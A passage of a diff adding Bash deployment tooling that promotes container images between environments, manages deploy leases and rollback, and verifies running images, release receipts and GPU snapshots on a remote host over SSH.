+    verify_status=0
+    if ACX_VERIFY_EXPECT_LOCAL=1 do_verify "$env"; then
+      verify_status=0
+    else
+      verify_status=$?
+    fi
+    case "$verify_status" in
+      0) ;;
+      2) report_verify_expectation_error "$env" "Deploy" ;;
+      *) handle_failed_verification "$env" "Deploy" ;;
+    esac
+  fi
+  if [[ "$completion" == aggregate ]]; then
+    recognition_edge_finish || fail "shared edge transaction completion failed; journal retained"
+  fi
+  ACX_DEPLOY_PHASE=""
+}
+
+do_deploy() {
+  local env="$1"
+  shift || true
+  local check=0
+  [[ "${1:-}" == "--check" ]] && check=1
+
+  # Read-only drift check bypasses build/push and the promote confirmation.
+  if ((check)); then
+    env_to_remote_dir "$env" >/dev/null # validate env before any network
+    preflight_ssh
+    converge_check "$env"
+    return 0
+  fi
+
+  # Public deploy always aggregate. Extra argv and inherited
+  # _ACX_SHIP_COMPLETION / ACX_* vars cannot select scoped (TEST-15).
+  _ship_selected_env "$env" aggregate
+}
+
+#---------------------------------------------------------------- promote
+do_promote() {
+  local from_env="$1" to_env="$2"
+  local verify_status source_sha rerun_command pending_interrupt
+  local from_tag to_tag
+  # Production-tier confirmation precedes every remote access (auth, ssh, preflight).
+  if is_prod_tier_env "$to_env" && [[ "${CONFIRM:-}" != "PROMOTE" ]]; then
+    fail "Production promotion requires CONFIRM=PROMOTE. Re-run: CONFIRM=PROMOTE $0 promote $from_env $to_env"
+  fi
+  init_deploy_ocir_docker_config
+  from_tag="$(env_to_tag "$from_env")" || return 1
+  to_tag="$(env_to_tag "$to_env")" || return 1
+
+  preflight_ssh
+  # Face-pipeline weights must exist before we re-point the to_env runtime (C-02).
+  preflight_remote_face_pipeline_models "$to_env"
+
+  preflight_env_manifest "$to_env"
+  preflight_remote_ocir_auth
+  deploy_env_lease acquire "${to_env}" || fail "deploy lease for ${to_env} unavailable; holder line: ${ACX_DEPLOY_LEASE_LAST_HOLDER:-unknown}; refusing to preserve the rollback tag"
+  preserve_rollback_tag "$to_env"
+  if [[ -n "${ACX_ROLLBACK_DIGEST_REF:-}" ]]; then
+    if ! capture_prior_runtime_identity "$to_env" "${ACX_PRIOR_IMAGE_ID:-}" 0; then
+      warn "ROLLBACK NOT PRESERVED: prior api container identity could not be captured; runtime rollback will fail closed"
+    fi
+  fi
+
+  # Pull the source image so the boot smoke can run it before it is promoted.
+  if [[ "${REMOTE_BUILD}" == "1" ]]; then
+    log "Mode: remote-retag (${SSH_TARGET})"
+    preflight_remote_docker
+    preflight_remote_ocir_auth
+    # A-11: promote remote branch materialises layers — same free-space floor.
+    assert_remote_disk_headroom_for_pull
+    log "Pulling source image ${IMAGE_BASE}:${from_tag} on ${SSH_TARGET}"
+    _pull_ref "${IMAGE_BASE}:${from_tag}"
+  else
+    preflight_docker
+    preflight_ocir_auth
+    log "Pulling source image ${IMAGE_BASE}:${from_tag}"
+    _pull_ref "${IMAGE_BASE}:${from_tag}"
+  fi
+  ACX_CANDIDATE_DIGEST_REF="$(image_digest_ref "${IMAGE_BASE}:${from_tag}")" ||
+    fail "Could not capture digest for promotion source ${IMAGE_BASE}:${from_tag}"
+
+  pin_deploy_sha
+  source_sha="$(image_commit_sha "${ACX_CANDIDATE_DIGEST_REF}")" ||
+    fail "cannot read APP_GIT_COMMIT_SHA from promotion source ${ACX_CANDIDATE_DIGEST_REF}; refusing to promote an image whose commit cannot be proven. ${to_env} env tag and runtime were not changed."
+  if [[ "${source_sha}" != "${DEPLOY_SHA}" ]]; then
+    rerun_command="GIT_REF=${source_sha}"
+    if is_prod_tier_env "${to_env}"; then
+      rerun_command+=" CONFIRM=PROMOTE"
+    fi
+    rerun_command+=" $0 promote ${from_env} ${to_env}"
+    fail "promotion source ${from_env} runs commit ${source_sha:0:12}, but this run expects DEPLOY_SHA=${DEPLOY_SHA:0:12}; ${to_env} env tag and runtime were not changed. Promote exactly what ${from_env} serves: ${rerun_command}"
+  fi
+  log "Promotion source commit ${source_sha:0:12} matches DEPLOY_SHA"
+
+  # Same safety gate as deploy: boot-smoke the source image + converge compose/
+  # unit after rollback was captured, then retag exactly the digest that passed.
+  ACX_DEPLOY_ENV="$to_env"
+  if ! deploy_env_lease renew "${to_env}"; then
+    ACX_DEPLOY_PHASE=""
+    ACX_DEPLOY_LEASE_ENV=""
+    fail "deploy lease for ${to_env} lost to ${ACX_DEPLOY_LEASE_LAST_HOLDER:-another transaction}; stopping without compensation because another transaction owns ${to_env}. Inspect: $(rollback_command_hint "${to_env}")"
+  fi
+  promote_gate "$to_env" "${ACX_CANDIDATE_DIGEST_REF}"
+  if ! deploy_env_lease renew "${to_env}"; then
+    ACX_DEPLOY_PHASE=""
+    ACX_DEPLOY_LEASE_ENV=""
+    fail "deploy lease for ${to_env} lost to ${ACX_DEPLOY_LEASE_LAST_HOLDER:-another transaction}; stopping without compensation because another transaction owns ${to_env}. Inspect: $(rollback_command_hint "${to_env}")"
+  fi
+
+  ACX_DEPLOY_TAG_PUSH_ACTIVE=1
+  if do_push_tag "$to_tag" "${ACX_CANDIDATE_DIGEST_REF}"; then
+    ACX_DEPLOY_PHASE=tag_promoted
+    ACX_DEPLOY_TAG_PUSH_ACTIVE=0
+    if [[ -n "${ACX_DEPLOY_PENDING_INTERRUPT}" ]]; then
+      pending_interrupt="${ACX_DEPLOY_PENDING_INTERRUPT}"
+      ACX_DEPLOY_PENDING_INTERRUPT=""
+      deploy_interrupt_cleanup "${pending_interrupt}"
+    fi
+  else
+    ACX_DEPLOY_PHASE=compensating
+    ACX_DEPLOY_TAG_PUSH_ACTIVE=0
+    if ! deploy_env_lease renew "${to_env}"; then
+      skip_compensation_after_lease_loss "${to_env}"
+      fail "stopping without compensation after deploy lease loss for ${to_env}"
+    fi
+    capture_failure_evidence "$to_env" pre_candidate || warn "automatic failure evidence capture failed; continuing with rollback"
+    local rollback_status=0 repo_restore_status=0
+    if restore_env_tag_to_rollback "$to_env" 0; then
+      :
+    else
+      rollback_status=$?
+      warn "automatic env-tag restore failed; refusing further runtime compensation; run: $(rollback_command_hint "$to_env")"
+    fi
+    if ((rollback_status != 75)); then
+      restore_prior_image_repo_env || {
+        repo_restore_status=$?
+        warn "prior sticky repository restore failed"
+      }
+    fi
+    if ((rollback_status == 0 && repo_restore_status == 0)); then
+      ACX_DEPLOY_PHASE=""
+    fi
+    if [[ -n "${ACX_DEPLOY_PENDING_INTERRUPT}" ]]; then
+      pending_interrupt="${ACX_DEPLOY_PENDING_INTERRUPT}"
+      ACX_DEPLOY_PENDING_INTERRUPT=""
+      deploy_interrupt_cleanup "${pending_interrupt}"
+    fi
+    rollback_failure "${rollback_status}" "Promotion tag/push failed. Recovery: $(rollback_command_hint "$to_env")"
+  fi
+
+  if ! deploy_env_lease renew "${to_env}"; then
+    ACX_DEPLOY_PHASE=""
+    ACX_DEPLOY_LEASE_ENV=""
+    fail "deploy lease for ${to_env} lost to ${ACX_DEPLOY_LEASE_LAST_HOLDER:-another transaction}; stopping without compensation because another transaction owns ${to_env}. Inspect: $(rollback_command_hint "${to_env}")"
+  fi
+  if ! do_restart "$to_env" "${ACX_CANDIDATE_DIGEST_REF}"; then
+    ACX_DEPLOY_PHASE=compensating
+    if ! deploy_env_lease renew "${to_env}"; then
+      skip_compensation_after_lease_loss "${to_env}"
+      fail "stopping without compensation after deploy lease loss for ${to_env}"
+    fi
+    capture_failure_evidence "$to_env" "${ACX_RESTART_EVIDENCE_PHASE:-pre_candidate}" || warn "automatic failure evidence capture failed; continuing with rollback"
+    local restart_runtime
+    restart_runtime="$(cutover_failure_restart_runtime)"
+    local rollback_status=0 repo_restore_status=0
+    if restore_env_tag_to_rollback "$to_env" "${restart_runtime}"; then
+      :
+    else
+      rollback_status=$?
+      warn "automatic env-tag restore failed; refusing further runtime compensation; run: $(rollback_command_hint "$to_env")"
+    fi
+    if ((rollback_status != 75)); then
+      restore_prior_image_repo_env || {
+        repo_restore_status=$?
+        warn "prior sticky repository restore failed"
+      }
+    fi
+    if ((rollback_status == 0 && repo_restore_status == 0)); then
+      ACX_DEPLOY_PHASE=""
+    fi
+    rollback_failure "${rollback_status}" "Restart failed; previous env tag restored where possible. Recovery: $(rollback_command_hint "$to_env")"
+  fi
+  ACX_DEPLOY_PHASE=restarted
+
+  log "Promotion submitted. Verifying..."
+  verify_status=0
+  if ACX_VERIFY_EXPECT_LOCAL=1 do_verify "$to_env"; then
+    verify_status=0
+  else
+    verify_status=$?
+  fi
+  case "$verify_status" in
+    0) ;;
+    2) report_verify_expectation_error "$to_env" "Promotion" ;;
+    *) handle_failed_verification "$to_env" "Promotion" ;;
+  esac
+  recognition_edge_finish || fail "shared edge transaction completion failed; journal retained"
+  ACX_DEPLOY_PHASE=""
+}
+
+#---------------------------------------------------------------- verify
+# Read the running api container's Config.Image from the remote host (rg-015).
+# Returns the raw reference on stdout; empty on inspect failure.
+read_running_api_image() {
+  local env="$1" remote_dir compose_files remote_dir_q timeout
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  compose_files="$(env_to_compose_files "$env")" || return 1
+  remote_dir_q="$(remote_quote "${remote_dir}")"
+  timeout="${ACX_REMOTE_INSPECT_TIMEOUT:-60}"
+  if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
+    fail "ACX_REMOTE_INSPECT_TIMEOUT must be a positive integer (got: ${timeout})"
+  fi
+  # shellcheck disable=SC2086 # compose_files is intentionally word-split (-f a -f b).
+  run_with_deadline "${timeout}" "running image reference inspection for ${env}" \
+    ssh -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
+    -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
+    -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "cd ${remote_dir_q} && cid=\$(docker compose ${compose_files} ps -q api 2>/dev/null | head -1) && \
+       [ -n \"\$cid\" ] && docker inspect --format '{{.Config.Image}}' \"\$cid\"" 2>/dev/null
+}
+
+write_deployed_release_receipt() {
+  local env="$1" sha="${2:-}" digest_ref="${3:-}" remote_dir timeout transaction remote_script remote_command
+  if [[ ! "${sha}" =~ ^[a-f0-9]{40}$ ||
+    ! "${digest_ref}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
+    return 1
+  fi
+  case "${env}" in
+    dev | dev-fir | staging | prod | dev-auraface | staging-auraface | prod-auraface) ;;
+    *) return 1 ;;
+  esac
+  recognition_edge_assert_if_active || return 75
+  remote_dir="$(env_to_remote_dir "${env}")" || return 1
+  timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
+  transaction="${ACX_DEPLOY_TRANSACTION_ID:-}"
+  remote_script='set -eu
+dir=$1
+env=$2
+sha=$3
+digest_ref=$4
+transaction=$5
+ownership_check=$6
+owned() { bash -c "$ownership_check"; }
+owned || exit 75
+tmp=$(mktemp "$dir/.deployed-release.XXXXXX")
+trap '\''owned && rm -f -- "$tmp"'\'' EXIT
+owned || exit 75
+python3 -c '\''import datetime,json,sys; env,sha,digest_ref,transaction=sys.argv[1:]; deployed_at=datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00","Z"); print(json.dumps({"env":env,"sha":sha,"digest_ref":digest_ref,"deployed_at":deployed_at,"transaction":transaction},separators=(",",":")))'\'' "$env" "$sha" "$digest_ref" "$transaction" >"$tmp"
+owned || exit 75
+chmod 600 "$tmp"
+owned || exit 75
+mv -f -- "$tmp" "$dir/deployed-release.json"
+trap - EXIT'
+  remote_command="sudo sh -c $(remote_quote "${remote_script}") sh $(remote_quote "${remote_dir}") $(remote_quote "${env}") $(remote_quote "${sha}") $(remote_quote "${digest_ref}") $(remote_quote "${transaction}") \"\$ACX_RECOGNITION_OWNERSHIP_CHECK\""
+  recognition_edge_command "$remote_command"
+}
+
+read_deployed_release_receipt() {
+  local env="$1" remote_dir receipt_path timeout raw receipt_fields rc=0
+  case "${env}" in
+    dev | dev-fir | staging | prod | dev-auraface | staging-auraface | prod-auraface) ;;
+    *) return 1 ;;
+  esac
+  remote_dir="$(env_to_remote_dir "${env}")" || return 1
+  receipt_path="${remote_dir}/deployed-release.json"
+  timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
+  raw="$(run_with_deadline "${timeout}" "deployed release receipt read for ${env}" \
+    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "sudo cat -- $(remote_quote "${receipt_path}")" 2>/dev/null)" || rc=$?
+  ((rc == 0)) || return 1
+  [[ -n "${raw}" ]] || return 1
+  receipt_fields="$(printf '%s' "${raw}" | python3 -c 'import json,re,sys; d=json.load(sys.stdin); keys={"env","sha","digest_ref","deployed_at","transaction"}; sha=d.get("sha"); digest_ref=d.get("digest_ref"); valid=isinstance(d,dict) and set(d)==keys and d.get("env")==sys.argv[1] and isinstance(sha,str) and re.fullmatch(r"[a-f0-9]{40}",sha) and isinstance(digest_ref,str) and re.fullmatch(r"[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}",digest_ref); sys.exit(1) if not valid else None; print(sha); print(digest_ref)' "${env}")" || return 1
+  printf '%s\n' "${receipt_fields}"
+}
+
+# Read remote .env ACX_IMAGE_REPO (empty if unset). Charset-validated when present.
+# S2-A-05: never call fail() inside this function when used from command
+# substitution — fail() would only kill the subshell and the caller’s `|| true`
+# would swallow it. On validation failure print sentinel __INVALID_REPO__ and
+# return 2 so callers fail closed.
+# D10: standalone `verify` against a VLM deploy must use the shipped sticky repo,
+# not the local default recognition resolve, so operators need not re-export
+# ACX_BUILD_TARGET=runtime-vlm just to verify.
+read_remote_image_repo() {
+  local env="$1" remote_dir raw timeout rc=0
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
+  raw="$(run_with_deadline "${timeout}" "remote ACX_IMAGE_REPO read for ${env}" \
+    ssh -o BatchMode=yes -o ConnectTimeout=10 -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "f='${remote_dir}/.env'; \
+       if sudo test -f \"\$f\" 2>/dev/null; then sudo grep -E '^ACX_IMAGE_REPO=' \"\$f\" 2>/dev/null | tail -1 | cut -d= -f2-; \
+       elif test -f \"\$f\"; then grep -E '^ACX_IMAGE_REPO=' \"\$f\" 2>/dev/null | tail -1 | cut -d= -f2-; fi" \
+    2>/dev/null)" || rc=$?
+  ((rc == 0)) || return "${rc}"
+  raw="$(printf '%s' "${raw}" | tr -d "\"' \r")"
+  if [[ -n "${raw}" ]]; then
+    if [[ ! "${raw}" =~ ^[A-Za-z0-9_.:/-]+$ ]]; then
+      printf '%s\n' "__INVALID_REPO__"
+      return 2
+    fi
+    printf '%s\n' "${raw}"
+  fi
+}
+
+# Expected image_variant label for the current local resolve (HARM-A-04).
+# recognition when empty; vlm when ACX_BUILD_TARGET matches *vlm* or variant=vlm.
+expected_image_variant() {
+  if is_vlm_smoke_budget; then
+    printf '%s\n' "vlm"
+  else
+    printf '%s\n' "recognition"
+  fi
+}
+
+# Derive variant from an image repository path (*-vlm → vlm).
+variant_from_image_repo() {
+  local repo="$1"
+  case "${repo}" in
+    *-vlm) printf '%s\n' "vlm" ;;
+    *) printf '%s\n' "recognition" ;;
+  esac
+}
+
+# Compare live container image repo to expected (return 1 on mismatch — never
+# call fail/exit here so `if ! do_verify` and ACX_VERIFY_OPTIONAL=1 work — D10).
+# S2-A-04: local resolve is authoritative when the operator set a variant selector
+# OR when ACX_VERIFY_EXPECT_LOCAL=1 (deploy/promote path). Remote .env is only
+# consulted for bare standalone `verify` so VLM recovery works without re-export.
+verify_running_image_matches_deployed() {
+  local env="$1" env_tag expected_repo expected_ref running_image remote_repo source_note repo_rc=0
+  local expected_digest running_image_id expected_image_id
+  env_tag="$(env_to_tag "$env")" || return 1
+  remote_repo="$(read_remote_image_repo "$env")" || repo_rc=$?
+  if ((repo_rc != 0)); then
+    warn "IMAGE VERIFY: remote ACX_IMAGE_REPO state is unknown on ${env} (read exit ${repo_rc})"
+    return 1
+  fi
+  if [[ "${remote_repo}" == "__INVALID_REPO__" ]]; then
+    warn "IMAGE VERIFY: remote ACX_IMAGE_REPO on ${env} failed charset validation (fail-closed)"
+    return 1
+  fi
+  if [[ "${ACX_VERIFY_EXPECT_LOCAL:-0}" == "1" ||
+    -n "${ACX_BUILD_TARGET:-}" ||
+    -n "${ACX_IMAGE_VARIANT:-}" ]]; then
+    expected_repo="${ACX_IMAGE_REPO}"
+    source_note="local resolve"
+  elif [[ -n "${remote_repo}" ]]; then
+    expected_repo="${remote_repo}"
+    source_note="remote .env"
+  else
+    expected_repo="${ACX_IMAGE_REPO}"
+    source_note="local resolve (no remote key)"
+  fi
+  if [[ ! "${expected_repo}" =~ ^[A-Za-z0-9_.:/-]+$ ]]; then
+    warn "IMAGE VERIFY: expected image repo failed charset validation: ${expected_repo}"
+    return 1
+  fi
+  expected_ref="${expected_repo}:${env_tag}"
+  running_image="$(read_running_api_image "$env" || true)"
+  if [[ -z "${running_image}" ]]; then
+    warn "IMAGE VERIFY: could not read running api Config.Image on ${env} (container missing?)"
+    return 1
+  fi
+  # Accept tag form (repo:tag) or digest form (repo@sha256:...) under expected_repo.
+  case "${running_image}" in
+    "${expected_repo}:"* | "${expected_repo}"@*)
+      ;;
+    *)
+      # Loud mismatch — silent success with the wrong repo was the VLM deploy bug.
+      # return (not fail/exit) so callers can honor ACX_VERIFY_OPTIONAL.
+      warn "IMAGE MISMATCH: ${env} running container image is '${running_image}', expected repository '${expected_repo}' via ${source_note} (deployed as ${expected_ref}). Variant deploys must not silently run a different repo."
+      return 1
+      ;;
+  esac
+
+  # Repo/tag and commit labels are not immutable identity. During deploy,
+  # promote, and rollback, compare the serving container's image ID with the ID
+  # resolved from the exact digest that crossed the smoke/rollback fence.
+  expected_digest="${ACX_CANDIDATE_DIGEST_REF:-${ACX_ROLLBACK_DIGEST_REF:-}}"
+  if [[ "${ACX_VERIFY_EXPECT_LOCAL:-0}" == "1" ]]; then
+    if [[ ! "${expected_digest}" =~ ^${expected_repo}@sha256:[a-f0-9]{64}$ ]]; then
+      warn "IMMUTABLE IMAGE VERIFY: no valid expected digest for ${env}"
+      return 1
+    fi
+    running_image_id="$(read_running_api_image_id "${env}" || true)"
+    expected_image_id="$(remote_image_id_for_digest "${expected_digest}" || true)"
+    if [[ -z "${running_image_id}" || "${running_image_id}" != "${expected_image_id}" ]]; then
+      warn "IMMUTABLE IMAGE MISMATCH: ${env} serves ${running_image_id:-unknown}, expected ${expected_image_id:-unknown} from ${expected_digest}"
+      return 1
+    fi
+  fi
+  log "Image verified: ${env} running ${running_image} (repo matches ${expected_repo} via ${source_note}; immutable_digest=${expected_digest:-not-required})"
+  return 0
+}
+
+probe_budget() {
+  local prefix="$1" default_attempts="$2" default_sleep="$3"
+  local attempts_var="${prefix}_ATTEMPTS" sleep_var="${prefix}_SLEEP"
+  local max_attempts="${!attempts_var:-$default_attempts}" sleep_s="${!sleep_var:-$default_sleep}"
+  if [[ ! "${max_attempts}" =~ ^[1-9][0-9]*$ ]]; then
+    warn "${attempts_var} must be a positive integer (got: ${max_attempts})"
+    return 1
+  fi
+  if [[ ! "${sleep_s}" =~ ^(0|[1-9][0-9]*)$ ]]; then
+    warn "${sleep_var} must be a non-negative integer (got: ${sleep_s})"
+    return 1
+  fi
+  if ((${#max_attempts} > 2 || max_attempts > 60)); then
+    warn "${attempts_var}=${max_attempts} exceeds the maximum of 60 attempts"
+    return 1
+  fi
+  if ((${#sleep_s} > 3 || sleep_s > 120)); then
+    warn "${sleep_var}=${sleep_s} exceeds the maximum of 120 seconds"
+    return 1
+  fi
+  printf '%s %s\n' "${max_attempts}" "${sleep_s}"
+}
+
+verify_retry_sleep() {
+  local attempt="$1" max_attempts="$2" base="$3" jitter delay
+  ((attempt < max_attempts)) || return 0
+  if ((base == 0)); then
+    return 0
+  fi
+  jitter=$((RANDOM % (base / 2 + 1)))
+  delay=$((base + jitter))
+  sleep "${delay}"
+}
+
+sibling_gpu_snapshots_complete() {
+  local env="$1" other timeout conf
+  env_to_unit "$env" >/dev/null
+  conf="${DEPLOY_ASSETS_DIR}/gpu-snapshot-deployments.conf"
+  if [[ ! -r "$conf" ]]; then
+    warn "GPU snapshot deployment registry is missing or unreadable: ${conf}"
+    return 1
+  fi
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  while IFS= read -r other || [[ -n "${other}" ]]; do
+    [[ -n "${other}" ]] || {
+      warn "GPU snapshot deployment registry contains an empty entry: ${conf}"
+      return 1
+    }
+    if [[ ! "${other}" =~ ^[a-z0-9]+(-[a-z0-9]+)*$ ]]; then
+      warn "invalid GPU snapshot deployment '${other}' in ${conf}"
+      return 1
+    fi
+    [[ "${other}" != "${env}" ]] || continue
+    if ! run_with_deadline "${timeout}" "sibling snapshot probe ${other}" \
+      ssh -l "${OCI_USER}" -- "${OCI_HOST}" \
+      "sudo test -f $(remote_quote "/run/acx-write/${other}/describe-load.json")"; then
+      return 1
+    fi
+  done <"${conf}"
+  return 0
+}
+
+verify_scoped_producer_snapshots() {
+  local env="$1" remote_dir timeout stale now_epoch env_q remote_q stale_q now_q
+  env_to_unit "$env" >/dev/null
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  stale="${ACX_DESCRIBE_LOAD_STALE_SECONDS:-120}"
+  if ! [[ "${stale}" =~ ^[1-9][0-9]*$ ]]; then
+    warn "ACX_DESCRIBE_LOAD_STALE_SECONDS must be a positive integer (got: ${stale})"
+    return 1
+  fi
+  now_epoch="${ACX_NOW_EPOCH:-}"
+  if [[ -n "${now_epoch}" ]] && ! [[ "${now_epoch}" =~ ^[0-9]+([.][0-9]+)?$ ]]; then
+    warn "ACX_NOW_EPOCH must be numeric (got: ${now_epoch})"
+    return 1
+  fi
+  env_q="$(remote_quote "$env")"
+  remote_q="$(remote_quote "$remote_dir")"
+  stale_q="$(remote_quote "$stale")"
+  now_q="$(remote_quote "$now_epoch")"
+  log "Scoped producer-preparation: verifying ${env} writer/schema/freshness at /run/acx-write/${env}/describe-load.json"
+  run_with_deadline "${timeout}" "scoped producer snapshot ${env}" \
+    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "bash -s" <<SCOPED_PRODUCER
+set -euo pipefail
+env=${env_q}
+remote_dir=${remote_q}
+stale=${stale_q}
+now_epoch=${now_q}
+load_dir="/run/acx-write/\$env"
+load_path="\$load_dir/describe-load.json"
+compose="\$remote_dir/docker-compose.env.yml"
+sudo test -f "\$compose" || {
+  echo "scoped producer-preparation: compose file missing: \$compose" >&2
+  exit 1
+}
+sudo grep -Fq -- 'ACX_DESCRIBE_LOAD_PATH=/run/acx-write/\${ACX_ENV}/describe-load.json' "\$compose" || {
+  echo "scoped producer-preparation: compose ACX_DESCRIBE_LOAD_PATH is not the effective /run/acx-write/<env>/describe-load.json writer" >&2
+  exit 1
+}
+sudo test -d "\$load_dir" || {
+  echo "scoped producer-preparation: missing describe-load writer directory: \$load_dir" >&2
+  exit 1
+}
+sudo test -f "\$load_path" || {
+  echo "scoped producer-preparation: missing describe-load.json at \$load_path" >&2
+  exit 1
+}
+sudo python3 -c '
+import json, math, sys, time
+path, stale_s, now_s = sys.argv[1:]
+stale = float(stale_s)
+now = float(now_s) if now_s else time.time()
+def fail(message):
+    sys.stderr.write("%s: %s\n" % (path, message))
+    raise SystemExit(1)
+try:
+    payload = json.load(open(path, encoding="utf-8"))
+except (OSError, UnicodeDecodeError, json.JSONDecodeError) as exc:
+    fail("snapshot must contain valid JSON: %s" % exc)
+if not isinstance(payload, dict):
+    fail("snapshot root must be an object")
+written_at = payload.get("written_at")
+if isinstance(written_at, bool) or not isinstance(written_at, (int, float)) or not math.isfinite(written_at):
+    fail("written_at must be finite epoch seconds")
+for field in ("queue_depth", "in_flight"):
+    if field not in payload:
+        fail("%s is required" % field)
+    value = payload[field]
+    if isinstance(value, bool) or not isinstance(value, int) or value < 0:
+        fail("%s must be a non-negative integer" % field)
+if "batch_in_progress" in payload and not isinstance(payload["batch_in_progress"], bool):
+    fail("batch_in_progress must be a boolean when present")
+age = now - written_at
+if age < -5:
+    fail("written_at exceeds 5s future-skew tolerance: %s" % written_at)
+if age > stale:
+    fail("stale describe-load snapshot: age %ss exceeds %ss budget" % (age, stale))
+' "\$load_path" "\$stale" "\$now_epoch"
+echo "OK: scoped producer-preparation for \$env describe-load writer is fresh"
+SCOPED_PRODUCER
+}
+
+verify_live_gpu_snapshots() {
+  local env="$1" remote_dir payload expected_bytes expected_sha gate_timeout transport_rc=0
+  env_to_unit "$env" >/dev/null
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  gate_timeout="${ACX_GPU_SNAPSHOT_GATE_TIMEOUT_SECONDS:-60}"
+  if ! [[ "${gate_timeout}" =~ ^[1-9][0-9]*$ ]]; then
+    fail "ACX_GPU_SNAPSHOT_GATE_TIMEOUT_SECONDS must be a positive integer (got: ${gate_timeout})"
+  fi
+  command -v timeout >/dev/null 2>&1 || fail "timeout command is required for GPU snapshot verification"
+  log "Verifying live GPU snapshot contract on ${SSH_TARGET} (${env})"
+  payload="$(mktemp)"
+  if ! {
+    paste -sd, "${DEPLOY_ASSETS_DIR}/gpu-snapshot-deployments.conf"
+    cat "${DEPLOY_ASSETS_DIR}/check-gpu-snapshots.sh"
+  } >"${payload}"; then
+    rm -f "${payload}"
+    fail "could not build GPU snapshot checker payload"
+  fi
+  expected_bytes="$(wc -c <"${payload}" | tr -d ' ')"
+  expected_sha="$(sha256sum "${payload}" | awk '{print $1}')"
+  {
+    printf 'ACX_GPU_CHECKER_V1 %s %s\n' "${expected_bytes}" "${expected_sha}"
+    cat "${payload}"
+  } | timeout --foreground --signal=TERM --kill-after=5s "${gate_timeout}s" \
+    ssh -o BatchMode=yes -o ConnectTimeout=10 -o ServerAliveInterval=5 \
+    -o ServerAliveCountMax=2 -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "set -eu
+    IFS=' ' read -r protocol expected_bytes expected_sha extra || { echo 'ERROR: missing GPU checker transport header' >&2; exit 90; }
+    [ \"\$protocol\" = ACX_GPU_CHECKER_V1 ] && [ -z \"\${extra:-}\" ] || { echo 'ERROR: invalid GPU checker transport header' >&2; exit 90; }
+    case \"\$expected_bytes\" in ''|*[!0-9]*) echo 'ERROR: invalid GPU checker byte count' >&2; exit 90 ;; esac
+    payload=\$(mktemp)
+    checker=\$(mktemp)
+    trap 'rm -f \"\$payload\" \"\$checker\"' EXIT
+    dd bs=1 count=\"\$expected_bytes\" of=\"\$payload\" status=none
+    actual_bytes=\$(wc -c <\"\$payload\" | tr -d ' ')
+    [ \"\$actual_bytes\" = \"\$expected_bytes\" ] || { echo \"ERROR: truncated GPU checker payload (\$actual_bytes of \$expected_bytes bytes)\" >&2; exit 91; }
+    extra_bytes=\$(dd bs=1 count=1 status=none | wc -c | tr -d ' ')
+    [ \"\$extra_bytes\" = 0 ] || { echo 'ERROR: oversized GPU checker payload' >&2; exit 91; }
+    actual_sha=\$(sha256sum \"\$payload\" | awk '{print \$1}')
+    [ \"\$actual_sha\" = \"\$expected_sha\" ] || { echo 'ERROR: GPU checker payload digest mismatch' >&2; exit 92; }
+    IFS= read -r deployments <\"\$payload\" || { echo 'ERROR: GPU checker payload has no deployment registry' >&2; exit 93; }
+    sed '1d' \"\$payload\" >\"\$checker\"
+    [ -s \"\$checker\" ] || { echo 'ERROR: GPU checker payload has no checker' >&2; exit 93; }
+    sudo env ACX_DESCRIBE_LOAD_DIR=/run/acx-write \
+      ACX_GPU_COMPOSE_FILE='${remote_dir}/docker-compose.env.yml' \
+      ACX_GPU_DEPLOYMENTS=\$deployments \
+      ACX_GPU_SNAPSHOT_DIR=/run/acx \
+      ACX_GPU_STATE_PATH=/run/acx/gpu-state.json \
+      ACX_GPU_UNIT_LOAD_DIR=/run/acx-write \
+      ACX_GPU_UNIT_STATE_PATH=/run/acx/gpu-state.json \
+      bash \"\$checker\"" || transport_rc=$?
+  rm -f "${payload}"
+  return "${transport_rc}"
+}
+
+emit_verify_ready_diagnostic() {
+  local ready_url="$1" ready_response="" ready_body ready_code ready_curl_rc=0
+  ready_response="$(curl --silent --show-error --max-time 10 --write-out $'\n%{http_code}' "$ready_url" 2>&1)" || ready_curl_rc=$?
+  if [[ "${ready_response}" == *$'\n'* ]]; then
+    ready_code="${ready_response##*$'\n'}"
+    ready_body="${ready_response%$'\n'*}"
+  else
+    ready_code="000"
+    ready_body="${ready_response}"
+  fi
+  [[ "${ready_code}" =~ ^[0-9]{3}$ ]] || ready_code="000"
+  printf 'GET %s -> HTTP %s (non-gating)\n' "$ready_url" "$ready_code"
+  if ((ready_curl_rc != 0)); then
+    if ! printf '%s\n' "${ready_body:-no readiness response}" | sanitize_deploy_diagnostic; then
+      echo "diagnostic: readiness body unavailable"
+    fi
+  else
+    if ! printf '%s\n' "$ready_body" | sanitize_deploy_diagnostic; then
+      echo "diagnostic: readiness body unavailable"
+    fi
+  fi
+}
+
+do_verify() {
+  local env="$1"
+  local url ready_url expected_sha actual_sha body attempt max_attempts sleep_s http_code curl_rc health_response budget
+  local actual_variant expected_variant remote_for_variant remote_repo_rc
+  local running_image_id candidate_image_id running_image_rc candidate_image_rc
+  local receipt_output receipt_digest_ref receipt_path image_mismatch gpu_budget gpu_max_attempts gpu_sleep_s gpu_attempt gpu_pass
+  url="$(env_to_health_url "$env")" || return 1
+  ready_url="$(env_to_ready_url "$env")" || return 1
+  pin_deploy_sha
+  expected_sha="${DEPLOY_SHA}"
+  if [[ "${ACX_VERIFY_EXPECT_LOCAL:-0}" != "1" ]]; then
